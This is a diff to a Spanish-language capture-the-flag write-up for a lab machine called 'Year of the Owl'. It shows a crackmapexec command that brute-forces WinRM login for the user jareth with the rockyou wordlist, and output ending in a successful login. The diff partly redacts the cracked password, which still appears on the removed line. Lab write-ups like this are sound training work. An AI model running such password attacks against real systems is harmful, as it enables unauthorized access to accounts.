@@ -236,10 +236,10 @@ Enunciado :
 
   - Obtenemos Credenciales de acceso.
 
-    Tenemos un listado de usuarios validos de la maquina victima, de momento nos vamos a interesar por --- Jareth --- ya que no es un usuario default.
+    Tenemos un listado de usuarios validos del sistema, de momento nos vamos a interesar por --- Jareth --- ya que no es un usuario default.
 
-    Intentamos con cr
-          
+    El proceso para obtener las pass lo podemos realizar mediante los servicios que estan corriendo en la maquina--> SMB(OK), WinRM(OK) y  RDP(no funciono)
+     
         ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
         └─# crackmapexec winrm 10.10.121.136 -u jareth -p /usr/share/wordlists/rockyou.txt 
         SMB         10.10.121.136   5985   YEAR-OF-THE-OWL  [*] Windows 10.0 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl)
@@ -248,7 +248,7 @@ Enunciado :
         WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [-] year-of-the-owl\jareth:12345
         [.......]
         [*] completed: 100.00% (1/1)                                                                                                           
-        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sarah (Pwn3d!)       
+        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sa--- (Pwn3d!)       
    
         
 
